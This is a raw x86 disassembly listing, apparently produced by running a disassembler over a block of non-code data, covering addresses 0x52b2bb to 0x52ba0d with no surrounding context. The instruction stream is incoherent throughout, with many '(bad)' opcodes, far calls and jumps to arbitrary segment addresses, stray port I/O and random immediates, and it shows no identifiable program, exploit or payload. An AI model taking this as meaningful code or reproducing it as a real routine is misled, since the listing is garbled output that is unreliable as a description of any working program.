  52b2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b2bc:	jle    0x52b28b
  52b2be:	sub    DWORD PTR [edx+0x30],edi
  52b2c1:	repnz retf 
  52b2c3:	daa    
  52b2c4:	dec    ebx
  52b2c5:	sub    dl,BYTE PTR [edi]
  52b2c7:	(bad)  
  52b2c8:	pop    edi
  52b2c9:	xor    DWORD PTR [esi-0x4c5c3281],esp
  52b2cf:	js     0x52b317
  52b2d1:	pop    ds
  52b2d2:	xchg   edx,eax
  52b2d3:	into   
  52b2d4:	cmp    esi,DWORD PTR [eax-0x72b686bf]
  52b2da:	in     al,0x94
  52b2dc:	cmp    DWORD PTR [ebp+0xc9550af],0x47
  52b2e3:	xchg   ebp,eax
  52b2e4:	shl    edx,cl
  52b2e6:	dec    ecx
  52b2e7:	bound  eax,QWORD PTR [ecx-0x16f9a004]
  52b2ed:	inc    eax
  52b2ee:	cmp    BYTE PTR [ecx-0x32c23890],ch
  52b2f4:	je     0x52b2c2
  52b2f6:	xor    esp,DWORD PTR [eax+ebx*8+0x9]
  52b2fa:	pop    esp
  52b2fb:	push   ds
  52b2fc:	call   0xb5f1:0xef77c4a
  52b303:	push   es
  52b304:	and    esi,DWORD PTR [edx+0x35f6b5f5]
  52b30a:	push   0xb89342c5
  52b30f:	mov    ah,0xfa
  52b311:	out    dx,al
  52b312:	cld    
  52b313:	mov    ah,0x5f
  52b315:	lods   eax,DWORD PTR ds:[esi]
  52b316:	ret    
  52b317:	mov    al,ds:0x81457c3c
  52b31c:	loop   0x52b2ae
  52b31e:	pop    edx
  52b31f:	sbb    DWORD PTR [eax],eax
  52b321:	imul   edx,esi,0x2f64a9ed
  52b327:	push   es
  52b328:	jnp    0x52b2df
  52b32a:	(bad)  [eax-0x14]
  52b32d:	shl    BYTE PTR [ebp-0x2f],1
  52b330:	cdq    
  52b331:	cwde   
  52b332:	pop    ss
  52b333:	fdivr  QWORD PTR [edx+0x3b2b2149]
  52b339:	ret    0x6ad7
  52b33c:	pop    ds
  52b33d:	mov    al,0xd5
  52b33f:	mov    bl,0xe7
  52b341:	fcom   st(4)
  52b343:	pushf  
  52b344:	inc    eax
  52b345:	imul   ebx,DWORD PTR [edi],0x10636a99
  52b34b:	push   esi
  52b34c:	push   edi
  52b34d:	pop    eax
  52b34e:	pop    es
  52b34f:	lods   al,BYTE PTR ds:[esi]
  52b350:	sub    al,0xb
  52b352:	outs   dx,BYTE PTR ds:[esi]
  52b353:	push   ebp
  52b354:	inc    ebx
  52b355:	and    eax,0x787a91c5
  52b35a:	sub    al,0x8e
  52b35c:	fld    QWORD PTR [eax]
  52b35e:	lods   al,BYTE PTR ds:[esi]
  52b35f:	jmp    FWORD PTR [esi]
  52b361:	push   esi
  52b362:	repnz repz aaa 
  52b365:	imul   ecx,DWORD PTR [esi],0xe80487bc
  52b36b:	sbb    eax,0x1b70adf2
  52b370:	jb     0x52b39e
  52b372:	sahf   
  52b373:	and    DWORD PTR [eax],edx
  52b375:	push   eax
  52b376:	dec    ebx
  52b377:	stos   BYTE PTR es:[edi],al
  52b378:	dec    ecx
  52b379:	sub    bl,BYTE PTR [ebp-0x7b]
  52b37c:	jno    0x52b335
  52b37e:	(bad)  
  52b37f:	jmp    0xfb2cb22a
  52b384:	jbe    0x52b405
  52b386:	fnstenv [ecx]
  52b388:	in     eax,0x1b
  52b38a:	das    
  52b38b:	popa   
  52b38c:	cmp    eax,0x23d968e1
  52b391:	inc    esi
  52b392:	and    bh,BYTE PTR [edi+0x626bfd53]
  52b398:	ret    0xcb18
  52b39b:	in     al,0x91
  52b39d:	inc    esi
  52b39e:	retf   0x19bc
  52b3a1:	xor    edx,DWORD PTR [eax]
  52b3a3:	mov    al,0xd1
  52b3a5:	(bad)  
  52b3a6:	loopne 0x52b3dd
  52b3a8:	or     DWORD PTR [ecx+0x68],0xb739da3a
  52b3af:	sub    DWORD PTR [edi-0x7d],ecx
  52b3b2:	(bad)  
  52b3b3:	jp     0x52b349
  52b3b5:	mov    cl,bl
  52b3b7:	repz xchg ecx,eax
  52b3b9:	(bad)  
  52b3ba:	mov    ds:0x1ea1a944,al
  52b3bf:	add    ah,al
  52b3c1:	cmp    BYTE PTR [esi-0xee05099],dh
  52b3c7:	add    ah,al
  52b3c9:	(bad)  
  52b3ca:	sar    DWORD PTR [esi+0x34],1
  52b3cd:	jmp    0xae13:0xf9f77b43
  52b3d4:	jecxz  0x52b367
  52b3d6:	jno    0x52b424
  52b3d8:	loope  0x52b38b
  52b3da:	adc    DWORD PTR [edi],eax
  52b3dc:	mov    ecx,0xb69667cd
  52b3e1:	div    DWORD PTR [ebp+0x6]
  52b3e4:	inc    ebp
  52b3e5:	daa    
  52b3e6:	mov    cr6,edx
  52b3e9:	jle    0x52b41e
  52b3eb:	mov    al,ds:0xb7d1c678
  52b3f0:	and    BYTE PTR [esi+ebx*2-0x77f14c28],ah
  52b3f7:	iret   
  52b3f8:	mov    WORD PTR [esi],es
  52b3fa:	addr16 xchg esi,eax
  52b3fc:	mov    edi,0x9b8e95c5
  52b401:	pop    ecx
  52b402:	aad    0x4a
  52b404:	test   al,0xae
  52b406:	xor    DWORD PTR [esi-0x337a573f],esi
  52b40c:	xchg   ecx,eax
  52b40d:	pop    es
  52b40e:	js     0x52b405
  52b410:	int    0x63
  52b412:	std    
  52b413:	pushw  ds
  52b415:	or     eax,0x16b77372
  52b41a:	rcr    dl,0x5e
  52b41d:	or     DWORD PTR [ebx-0x5f14dd94],ecx
  52b423:	(bad)  
  52b424:	sub    DWORD PTR [ebx+0x4aefdc5c],esi
  52b42a:	dec    esp
  52b42b:	mov    eax,ds:0x495e54f8
  52b430:	mov    ebp,DWORD PTR [edx+eax*4-0x34]
  52b434:	popf   
  52b435:	shl    DWORD PTR [ebx+0x72],1
  52b438:	and    DWORD PTR [ecx+0x5],edi
  52b43b:	in     al,0x35
  52b43d:	jecxz  0x52b414
  52b43f:	and    DWORD PTR [edi+esi*2+0xf],esi
  52b443:	xchg   edx,eax
  52b444:	retf   0x76e1
  52b447:	xchg   ecx,eax
  52b448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52b449:	push   ebp
  52b44a:	std    
  52b44b:	mov    ebp,0x60659fd4
  52b450:	sbb    al,0x10
  52b452:	cmp    dh,BYTE PTR [esi-0x3fd290e7]
  52b458:	mov    al,0x2f
  52b45a:	aam    0xad
  52b45c:	inc    edx
  52b45d:	cld    
  52b45e:	cli    
  52b45f:	mov    DWORD PTR [edx*8-0x167b2f51],0xd8c84481
  52b46a:	repz xor BYTE PTR [esi],bh
  52b46d:	pop    ebx
  52b46e:	push   es
  52b46f:	push   es
  52b470:	xchg   esp,eax
  52b471:	call   0x7593:0x5958b8f2
  52b478:	retf   
  52b479:	xor    bh,BYTE PTR [edx+0x69]
  52b47c:	ss sub cl,ah
  52b47f:	push   es
  52b480:	loopne 0x52b45a
  52b482:	dec    ebx
  52b483:	mov    DWORD PTR [si],edi
  52b486:	jae    0x52b481
  52b488:	cmp    DWORD PTR [ecx],edx
  52b48a:	jl     0x52b4b1
  52b48c:	repz pop ss
  52b48e:	push   edi
  52b48f:	adc    dh,dh
  52b491:	and    BYTE PTR [ecx-0x3eca339f],bl
  52b497:	push   ebx
  52b498:	xor    eax,DWORD PTR [ecx-0x53]
  52b49b:	repz ficomp WORD PTR [edx-0x5d]
  52b49f:	scas   eax,DWORD PTR es:[edi]
  52b4a0:	cmp    DWORD PTR [edx-0x16e1b26f],esi
  52b4a6:	mov    esi,0x6822e2df
  52b4ab:	jns    0x52b47d
  52b4ad:	add    BYTE PTR [eax-0x5],dl
  52b4b0:	sbb    DWORD PTR [eax-0x2170d84f],ebx
  52b4b6:	scas   al,BYTE PTR es:[edi]
  52b4b7:	shr    ebx,0x4
  52b4ba:	and    ebx,DWORD PTR [edx]
  52b4bc:	gs sub al,0xd9
  52b4bf:	leave  
  52b4c0:	xchg   edi,eax
  52b4c1:	mov    dl,BYTE PTR [esi+eax*8-0x2]
  52b4c5:	(bad)  
  52b4c6:	js     0x52b52b
  52b4c8:	inc    eax
  52b4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52b4ca:	sub    al,0xa3
  52b4cc:	pop    ecx
  52b4cd:	push   cs
  52b4ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52b4cf:	clc    
  52b4d0:	pusha  
  52b4d1:	add    eax,0x5ab28b66
  52b4d6:	iret   
  52b4d7:	jle    0x52b4bb
  52b4d9:	and    esi,DWORD PTR [edx-0x78]
  52b4dc:	xor    al,0xba
  52b4de:	es inc esp
  52b4e0:	mov    edx,0xcb233b67
  52b4e5:	ja     0x52b550
  52b4e7:	push   0x20e7201f
  52b4ec:	ficomp DWORD PTR [edi+0x6b]
  52b4ef:	pop    edi
  52b4f0:	out    0xa2,al
  52b4f2:	mov    eax,0xf4b5e875
  52b4f7:	loopne 0x52b487
  52b4f9:	mov    edi,0x282bf60c
  52b4fe:	jle    0x52b482
  52b500:	hlt    
  52b501:	call   FWORD PTR [ecx+0x2c]
  52b504:	scas   eax,DWORD PTR es:[edi]
  52b505:	xchg   ebx,eax
  52b506:	jle    0x52b4b6
  52b508:	fs test eax,0xa73cda4b
  52b50e:	xchg   esp,eax
  52b50f:	jl     0x52b500
  52b511:	push   ss
  52b512:	push   ebx
  52b513:	add    BYTE PTR [ebx-0x7b08f75f],bl
  52b519:	pop    ecx
  52b51a:	mov    edx,0xdf348369
  52b51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52b520:	sbb    dl,BYTE PTR [edx+0xa7304e9]
  52b526:	mov    ecx,DWORD PTR [esi-0x18]
  52b529:	packssdw mm2,mm4
  52b52c:	inc    BYTE PTR [edx+0x78]
  52b52f:	les    esp,FWORD PTR [ebx-0x4fb80980]
  52b535:	or     al,0xc4
  52b537:	push   esi
  52b538:	retf   
  52b539:	mov    ebx,0x863fddc4
  52b53e:	repnz xor esi,0xd79049e2
  52b545:	clc    
  52b546:	loope  0x52b586
  52b548:	int    0xe4
  52b54a:	inc    ebx
  52b54b:	cwde   
  52b54c:	dec    eax
  52b54d:	push   ecx
  52b54e:	sahf   
  52b54f:	push   edi
  52b550:	hlt    
  52b551:	push   eax
  52b552:	xor    eax,0xaa70e1c5
  52b557:	dec    ebx
  52b558:	imul   ebx,DWORD PTR [ecx+0x1f],0x42
  52b55c:	push   0x6a646dc
  52b561:	pop    edi
  52b562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52b563:	jg     0x52b550
  52b565:	xor    edi,eax
  52b567:	int    0x78
  52b569:	fld    DWORD PTR [eax-0x22]
  52b56c:	push   ds
  52b56d:	push   ss
  52b56e:	xchg   BYTE PTR [ebx-0xc57b812],ch
  52b574:	aad    0x6a
  52b576:	xor    al,0x17
  52b578:	xchg   edi,eax
  52b579:	mov    DWORD PTR [ebx-0x4926f3d4],ebp
  52b57f:	loopne 0x52b57a
  52b581:	sbb    BYTE PTR [eax],ah
  52b583:	sbb    DWORD PTR [esi+0x47c3af67],esp
  52b589:	xchg   esp,eax
  52b58a:	inc    edx
  52b58b:	mov    edx,0xf902f63
  52b590:	push   ds
  52b591:	(bad)  
  52b592:	mov    dl,0x7a
  52b594:	pop    ebp
  52b595:	jmp    0xaab2:0x643ec21b
  52b59c:	imul   ecx,ebp,0xffffffb3
  52b59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b5a1:	push   cs
  52b5a2:	sub    ebx,esi
  52b5a4:	cli    
  52b5a5:	inc    ecx
  52b5a6:	mov    dl,0x9a
  52b5a8:	es arpl ax,sp
  52b5ab:	mov    edx,edi
  52b5ad:	mov    esi,DWORD PTR [ecx-0x78]
  52b5b0:	add    esi,DWORD PTR [ecx+0x34]
  52b5b3:	(bad)  [edi]
  52b5b5:	faddp  st(4),st
  52b5b7:	sti    
  52b5b8:	add    cl,BYTE PTR [edx]
  52b5ba:	xor    cl,ch
  52b5bc:	adc    ch,dl
  52b5be:	gs or  al,0x7b
  52b5c1:	iret   
  52b5c2:	mov    bh,0x4d
  52b5c4:	or     ecx,DWORD PTR [edx-0x6d]
  52b5c7:	mov    ebx,0x26345592
  52b5cc:	pusha  
  52b5cd:	xchg   esi,eax
  52b5ce:	dec    esi
  52b5cf:	xchg   edx,eax
  52b5d0:	mov    ds:0x59991646,al
  52b5d5:	dec    ebp
  52b5d6:	mov    ecx,0xb52ec9f9
  52b5db:	xchg   esp,eax
  52b5dc:	cmp    DWORD PTR [ebx-0x57],ecx
  52b5df:	and    eax,0x9336d28
  52b5e4:	imul   edx,DWORD PTR [ecx+0x256d2a67],0xa060bb9e
  52b5ee:	mov    eax,ds:0xabd28748
  52b5f3:	call   0xa3b9c9a6
  52b5f8:	sub    BYTE PTR [esi],0xd
  52b5fb:	rcr    DWORD PTR [ecx+0x39],1
  52b5fe:	xlat   BYTE PTR ds:[ebx]
  52b5ff:	fwait
  52b600:	sti    
  52b601:	dec    esp
  52b602:	mov    esp,0xe07ba5e2
  52b607:	xor    al,0x5a
  52b609:	loop   0x52b59a
  52b60b:	pop    eax
  52b60c:	and    eax,0xc252488f
  52b611:	rcr    BYTE PTR [edi],1
  52b613:	push   ss
  52b614:	and    edx,DWORD PTR [edi-0x67f132b8]
  52b61a:	mov    esi,0x1f8d7eee
  52b61f:	inc    ebx
  52b620:	or     BYTE PTR [ecx],cl
  52b622:	(bad)  
  52b623:	jno    0x52b666
  52b625:	mov    al,0xa3
  52b627:	rcr    DWORD PTR [esp+edi*1-0x16],0xae
  52b62c:	daa    
  52b62d:	std    
  52b62e:	int3   
  52b62f:	hlt    
  52b630:	adc    DWORD PTR [edi+0x5a],0x6f8c6498
  52b637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52b638:	pop    eax
  52b639:	icebp  
  52b63a:	xor    dl,BYTE PTR [ebx]
  52b63c:	stos   BYTE PTR es:[edi],al
  52b63d:	add    DWORD PTR [edi+eax*1+0x17],esi
  52b641:	sbb    al,0xa1
  52b643:	shl    BYTE PTR gs:[esi-0x78ce99dc],cl
  52b64a:	xchg   ebp,eax
  52b64b:	xor    BYTE PTR [eax],0xbd
  52b64e:	cli    
  52b64f:	dec    edx
  52b650:	call   0x33ac:0xe253d67b
  52b657:	jmp    0x6fa57e28
  52b65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52b65d:	pop    ebx
  52b65e:	cmp    eax,0x1b746b8d
  52b663:	enter  0xcd95,0xdb
  52b667:	jo     0x52b614
  52b669:	je     0x52b613
  52b66b:	push   0x4c
  52b66d:	dec    ecx
  52b66e:	(bad)  
  52b670:	imul   ebp,DWORD PTR [ebp+edi*2-0x3d8ce659],0xc1ac93c0
  52b67b:	add    dh,BYTE PTR [edi+ebx*2]
  52b67e:	mov    dl,0x88
  52b680:	outs   dx,BYTE PTR ds:[esi]
  52b681:	jnp    0x52b646
  52b683:	mov    ebp,0x1df93d13
  52b688:	sbb    DWORD PTR [edx+0x556ecaf3],0xffffffc3
  52b68f:	or     BYTE PTR [esi],bh
  52b691:	adc    DWORD PTR [edx+eiz*4-0x6b537b2],edx
  52b698:	sbb    al,0x51
  52b69a:	pop    esp
  52b69b:	arpl   WORD PTR [ebx],ax
  52b69d:	jp     0x52b635
  52b69f:	push   ss
  52b6a0:	outs   dx,BYTE PTR ds:[esi]
  52b6a1:	inc    ecx
  52b6a2:	inc    edx
  52b6a3:	(bad)  
  52b6a4:	popf   
  52b6a5:	retf   0xc025
  52b6a8:	loopne 0x52b66f
  52b6aa:	push   es
  52b6ab:	out    dx,eax
  52b6ac:	dec    ebp
  52b6ad:	jmp    0x52b6eb
  52b6af:	xchg   ecx,eax
  52b6b0:	sbb    dl,0xf0
  52b6b3:	retf   0x1e47
  52b6b6:	iret   
  52b6b7:	(bad)  
  52b6b8:	cld    
  52b6b9:	sbb    al,0xbb
  52b6bb:	bound  esp,QWORD PTR [esi]
  52b6bd:	call   0x1a3f:0x6aa16c8f
  52b6c4:	cs jns 0x52b68b
  52b6c7:	xchg   BYTE PTR [edi],ah
  52b6c9:	jb     0x52b716
  52b6cb:	sbb    eax,ebp
  52b6cd:	and    DWORD PTR [ebx],edi
  52b6cf:	ficomp DWORD PTR [ebx]
  52b6d1:	mov    ah,0xcb
  52b6d3:	pop    eax
  52b6d4:	repz jbe 0x52b65c
  52b6d7:	nop
  52b6d8:	imul   edx,DWORD PTR [edi],0x74
  52b6db:	and    esp,ebx
  52b6dd:	outs   dx,DWORD PTR ds:[esi]
  52b6de:	or     dl,bh
  52b6e0:	pop    eax
  52b6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52b6e2:	inc    ebp
  52b6e3:	cmp    dl,BYTE PTR [edi+eiz*8]
  52b6e6:	nop
  52b6e7:	jl     0x52b670
  52b6e9:	fucomi st,st(4)
  52b6eb:	aas    
  52b6ec:	shr    edi,1
  52b6ee:	push   DWORD PTR [edi+0x6e6d6e2f]
  52b6f4:	out    0x27,eax
  52b6f6:	xchg   ecx,eax
  52b6f7:	jne    0x52b68e
  52b6f9:	jo     0x52b6cc
  52b6fb:	leave  
  52b6fc:	xchg   DWORD PTR [ebx],ebp
  52b6fe:	jecxz  0x52b764
  52b700:	cmp    ebp,DWORD PTR [eax-0x5d]
  52b703:	(bad)  
  52b704:	jae    0x52b771
  52b706:	pop    edx
  52b707:	pop    ds
  52b708:	sbb    BYTE PTR [edi+0x27],dh
  52b70b:	push   esi
  52b70c:	js     0x52b737
  52b70e:	outs   dx,DWORD PTR ds:[esi]
  52b70f:	and    BYTE PTR [ebx+0x24],ch
  52b712:	test   BYTE PTR ds:0x6852136d,cl
  52b718:	adc    ebp,ebp
  52b71a:	add    eax,DWORD PTR [eax-0x36]
  52b71d:	mov    eax,ds:0xd6c13787
  52b722:	(bad)  
  52b723:	mov    cl,0x34
  52b725:	mov    ds:0x2c5ff1ad,eax
  52b72a:	out    dx,al
  52b72b:	sub    BYTE PTR [ebp+0x559e4b71],bh
  52b731:	mov    bl,0xbb
  52b733:	rcl    BYTE PTR [edx-0x7d],cl
  52b736:	push   0xc
  52b738:	inc    eax
  52b739:	pavgw  mm1,QWORD PTR [ebp+0x13]
  52b73d:	mov    edx,gs
  52b73f:	fmul   QWORD PTR [edx+0xb]
  52b742:	mov    ah,0x65
  52b744:	pop    esi
  52b745:	out    0xe8,eax
  52b747:	lahf   
  52b748:	sbb    dh,ch
  52b74a:	and    BYTE PTR [ebx+0x7d],dl
  52b74d:	mov    ah,0xe8
  52b74f:	test   dh,dh
  52b751:	fild   QWORD PTR [edi-0x1e]
  52b754:	push   0xf9677667
  52b759:	jb     0x5eee3e56
  52b75f:	mov    eax,0x9ed60718
  52b764:	fwait
  52b765:	dec    esi
  52b766:	retf   0xd575
  52b769:	(bad)  
  52b76a:	fcom   QWORD PTR [ecx]
  52b76c:	std    
  52b76d:	jo     0x52b7d3
  52b76f:	retf   0x1931
  52b772:	jg     0x52b758
  52b774:	mov    ebp,0xbbaa6d93
  52b779:	pop    ebx
  52b77a:	(bad)  
  52b77b:	sahf   
  52b77c:	sub    ch,BYTE PTR [edi+0x61]
  52b77f:	and    al,0x2
  52b781:	lods   al,BYTE PTR ds:[esi]
  52b782:	scas   eax,DWORD PTR es:[edi]
  52b783:	ss and edi,esi
  52b786:	sbb    bh,bh
  52b788:	scas   eax,DWORD PTR es:[edi]
  52b789:	xchg   ecx,eax
  52b78a:	mov    esp,0xe8ec9ab1
  52b78f:	push   0xffffffb4
  52b791:	ror    DWORD PTR [ecx],0xb0
  52b794:	inc    ebp
  52b795:	(bad)
  52b798:	sub    BYTE PTR [eax+edi*8+0x6a],bl
  52b79c:	pop    eax
  52b79d:	mov    eax,DWORD PTR [edx+ebx*4+0x110018cc]
  52b7a4:	push   es
  52b7a5:	mov    ch,BYTE PTR [ebx-0x1c]
  52b7a8:	rol    DWORD PTR [esi-0x46],cl
  52b7ab:	pop    esi
  52b7ac:	xor    al,0x81
  52b7ae:	lods   eax,DWORD PTR ds:[esi]
  52b7af:	ret    
  52b7b0:	dec    esi
  52b7b1:	lock (bad) 
  52b7b3:	mov    al,ds:0x9851719d
  52b7b8:	test   al,0xf1
  52b7ba:	loope  0x52b771
  52b7bc:	adc    al,0x98
  52b7be:	into   
  52b7bf:	mov    bh,0xc8
  52b7c1:	xor    DWORD PTR [ebp+0x24],0xffffff95
  52b7c5:	sub    BYTE PTR [ecx+0x73ec11d3],bh
  52b7cb:	scas   al,BYTE PTR es:[edi]
  52b7cc:	adc    bh,BYTE PTR [esi+0x1f]
  52b7cf:	dec    edx
  52b7d0:	fdivp  st(6),st
  52b7d2:	inc    ecx
  52b7d3:	xchg   edi,eax
  52b7d4:	adc    al,0xb6
  52b7d6:	js     0x52b7c6
  52b7d8:	cmp    al,0x41
  52b7da:	arpl   WORD PTR [ecx+0x46],si
  52b7dd:	pop    esp
  52b7de:	sar    DWORD PTR [ebx-0x6f],0x91
  52b7e2:	cwde   
  52b7e3:	push   ebx
  52b7e4:	popf   
  52b7e5:	cmp    ebx,DWORD PTR [edi-0x73282063]
  52b7eb:	jnp    0x52b78d
  52b7ed:	sbb    DWORD PTR [edx-0x16],eax
  52b7f0:	push   0xffffff9d
  52b7f2:	add    DWORD PTR [ecx+0x39ab5dab],esi
  52b7f8:	fadd   st(4),st
  52b7fa:	jne    0x52b781
  52b7fc:	dec    eax
  52b7fd:	xchg   bh,cl
  52b7ff:	inc    edi
  52b800:	mov    edx,0x56518b05
  52b805:	mov    dh,0x4d
  52b807:	inc    esp
  52b808:	mov    eax,ds:0x517ded89
  52b80d:	push   ecx
  52b80e:	cmc    
  52b80f:	mov    ch,BYTE PTR [ebp+0x5e]
  52b812:	sub    BYTE PTR [ebx],0xdb
  52b815:	loope  0x52b891
  52b817:	mov    esp,0xfc24d0d6
  52b81c:	mov    edi,0x20d5e025
  52b821:	adc    al,0x39
  52b823:	sub    eax,0x7ea25a53
  52b828:	ss mov esp,0x8ff910dc
  52b82e:	and    ecx,edx
  52b830:	js     0x52b82a
  52b832:	pop    ds
  52b833:	in     eax,dx
  52b834:	dec    edi
  52b835:	arpl   WORD PTR [ebx],cx
  52b837:	nop
  52b838:	adc    DWORD PTR [ebx+0x1b],ecx
  52b83b:	push   ebx
  52b83c:	mov    ds:0xf17d454f,al
  52b841:	jnp    0x52b802
  52b843:	push   0xffffffde
  52b845:	jge    0x52b883
  52b847:	ins    BYTE PTR es:[edi],dx
  52b848:	das    
  52b849:	sub    ebx,ebx
  52b84b:	xor    DWORD PTR [ebx+eax*4-0x53582e2c],0xffffffbc
  52b853:	mov    BYTE PTR [ecx+0x14d3085d],0x8a
  52b85a:	jecxz  0x52b828
  52b85c:	mov    ah,0x78
  52b85e:	popa   
  52b85f:	jge    0x52b810
  52b861:	inc    ecx
  52b862:	(bad)  
  52b863:	adc    eax,0xa2adfcb8
  52b868:	cwde   
  52b869:	stc    
  52b86a:	enter  0x93bd,0xa8
  52b86e:	jle    0x52b8dd
  52b870:	(bad)  
  52b871:	sub    ebx,esi
  52b873:	inc    edi
  52b874:	adc    al,BYTE PTR [ebp+0x498d184d]
  52b87a:	imul   ebp,DWORD PTR [esp+ebp*2],0x2f186a95
  52b881:	adc    dl,ah
  52b883:	cmp    eax,0x79a92489
  52b888:	or     eax,0xede719c0
  52b88d:	jb     0x52b8b8
  52b88f:	and    BYTE PTR [edi+0x4a34db53],ch
  52b895:	sbb    al,0x9c
  52b897:	rcl    DWORD PTR [ecx-0x1b68c03b],1
  52b89d:	push   ds
  52b89e:	push   edi
  52b89f:	cmp    ecx,0xaacd596b
  52b8a5:	xchg   cl,al
  52b8a7:	pop    ds
  52b8a8:	mov    esp,0x61e79ada
  52b8ad:	pop    ebx
  52b8ae:	hlt    
  52b8af:	mov    WORD PTR [ecx-0x4c0f706e],ss
  52b8b5:	scas   eax,DWORD PTR es:[edi]
  52b8b6:	ss pop ebx
  52b8b8:	loop   0x52b894
  52b8ba:	rol    BYTE PTR [ebx+eax*2-0x72f859a],0xf8
  52b8c2:	ins    BYTE PTR es:[edi],dx
  52b8c3:	lahf   
  52b8c4:	mov    ds:0xad8d21df,eax
  52b8c9:	test   al,0x59
  52b8cb:	or     al,0xc0
  52b8cd:	and    ecx,DWORD PTR [esi]
  52b8cf:	leave  
  52b8d0:	unpcklps xmm7,XMMWORD PTR [eax+esi*1-0x90ff92f]
  52b8d8:	scas   eax,DWORD PTR es:[edi]
  52b8d9:	sbb    BYTE PTR [ebp+0x7b],dl
  52b8dc:	mov    ah,0x8d
  52b8de:	pop    ds
  52b8df:	aas    
  52b8e0:	push   ss
  52b8e1:	in     al,0x2c
  52b8e3:	loope  0x52b94d
  52b8e5:	fbstp  TBYTE PTR ds:0x694fd1ec
  52b8eb:	cmp    eax,DWORD PTR [esi]
  52b8ed:	jo     0x52b953
  52b8ef:	inc    eax
  52b8f0:	jp     0x52b8e9
  52b8f2:	(bad)  
  52b8f3:	out    dx,al
  52b8f4:	mov    ds:0x5083d08e,eax
  52b8f9:	inc    ebp
  52b8fa:	mov    ch,0xdb
  52b8fc:	push   ebx
  52b8fd:	mov    edx,0x227ee942
  52b902:	hlt    
  52b903:	shufps xmm0,XMMWORD PTR [eax+0x68],0x17
  52b908:	jp     0x52b8c5
  52b90a:	scas   eax,DWORD PTR es:[edi]
  52b90b:	mov    ah,dl
  52b90d:	nop
  52b90e:	and    BYTE PTR [edx-0x1f],dl
  52b911:	lods   al,BYTE PTR ds:[esi]
  52b912:	push   esp
  52b913:	jge    0x52b985
  52b915:	lods   al,BYTE PTR ds:[esi]
  52b916:	jne    0x52b8c6
  52b918:	hlt    
  52b919:	test   eax,0xdbf5e01a
  52b91e:	test   ecx,0x1c5cc5c1
  52b924:	dec    ecx
  52b925:	cli    
  52b926:	(bad)  [esi-0x14]
  52b929:	mov    ds:0x861c0532,eax
  52b92e:	or     eax,0xb1df3d24
  52b933:	push   eax
  52b934:	test   BYTE PTR [esi],al
  52b936:	out    dx,al
  52b937:	mov    dh,0x40
  52b939:	sub    ebp,DWORD PTR [edx+0x52]
  52b93c:	mov    ebx,0x55ac11ff
  52b941:	sub    eax,ecx
  52b943:	inc    edi
  52b944:	popf   
  52b945:	mov    edi,0xbe0a6a08
  52b94a:	loop   0x52b936
  52b94c:	imul   ebx,DWORD PTR [edi+0x37],0x7c9ec6d
  52b953:	add    ch,ch
  52b955:	pop    ebp
  52b956:	test   cl,0x97
  52b959:	pop    eax
  52b95a:	mov    DWORD PTR [esi],esi
  52b95c:	push   ecx
  52b95d:	or     eax,0xb15752ad
  52b962:	jae    0x52b910
  52b964:	jns    0x52b932
  52b966:	push   ss
  52b967:	push   ds
  52b968:	xchg   edx,eax
  52b969:	inc    esp
  52b96a:	mov    esp,0xe7a049e
  52b96f:	and    dh,BYTE PTR [edx+0x7346f590]
  52b975:	call   0x55a8f7e5
  52b97a:	mov    dl,0x59
  52b97c:	pop    edx
  52b97d:	pop    edi
  52b97e:	or     bh,ah
  52b980:	scas   eax,DWORD PTR es:[edi]
  52b981:	push   0xf80cace7
  52b986:	outs   dx,DWORD PTR ds:[esi]
  52b987:	iret   
  52b988:	test   BYTE PTR [ecx+0x64],ch
  52b98b:	push   cs
  52b98c:	in     al,dx
  52b98d:	stos   BYTE PTR es:[edi],al
  52b98e:	aas    
  52b98f:	cmp    edi,DWORD PTR ss:0xbbeb1ca6
  52b996:	frstor [eax+ebx*8+0x7c]
  52b99a:	out    dx,eax
  52b99b:	mov    dh,ch
  52b99d:	not    dl
  52b99f:	out    dx,eax
  52b9a0:	adc    bl,BYTE PTR [ecx]
  52b9a2:	jmp    0x63257290
  52b9a7:	bound  ecx,QWORD PTR [ecx+esi*4+0x60]
  52b9ab:	mov    bx,0x8a73
  52b9af:	sar    DWORD PTR [edi],0x45
  52b9b2:	xlat   BYTE PTR ds:[ebx]
  52b9b3:	or     ch,BYTE PTR [eax-0x51]
  52b9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b9b7:	cwde   
  52b9b8:	or     ebx,DWORD PTR [ecx+ecx*8]
  52b9bb:	call   0x50130b94
  52b9c0:	ins    BYTE PTR es:[edi],dx
  52b9c1:	loope  0x52b970
  52b9c3:	bound  ebx,QWORD PTR [ecx+ecx*2]
  52b9c6:	jnp    0x52ba46
  52b9c8:	bound  ebx,QWORD PTR ds:0x9236d9a
  52b9ce:	mov    dl,0xc9
  52b9d0:	dec    ebp
  52b9d1:	mov    ecx,DWORD PTR [edi]
  52b9d3:	ret    
  52b9d4:	js     0x52b9a0
  52b9d6:	out    0xb3,eax
  52b9d8:	adc    bh,BYTE PTR [eax]
  52b9da:	mov    esi,0x64856b48
  52b9df:	jp     0x52ba5f
  52b9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52b9e2:	push   0xffffff84
  52b9e4:	mov    al,ds:0x19aa788c
  52b9e9:	mov    ?,ebp
  52b9eb:	std    
  52b9ec:	rol    ebx,0x89
  52b9ef:	adc    ebp,DWORD PTR [eax]
  52b9f1:	mov    dl,0xd2
  52b9f3:	aad    0xdd
  52b9f5:	lods   al,BYTE PTR ds:[esi]
  52b9f6:	in     al,dx
  52b9f7:	idiv   edi
  52b9f9:	cmovo  esp,DWORD PTR [ecx]
  52b9fc:	jge    0x52b9cf
  52b9fe:	out    dx,eax
  52b9ff:	je     0x52b98e
  52ba01:	pop    edx
  52ba02:	sbb    esi,DWORD PTR [esi+0x60]
  52ba05:	nop
  52ba06:	mov    esp,0xfbbd2eb8
  52ba0b:	jno    0x52ba7a
  52ba0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
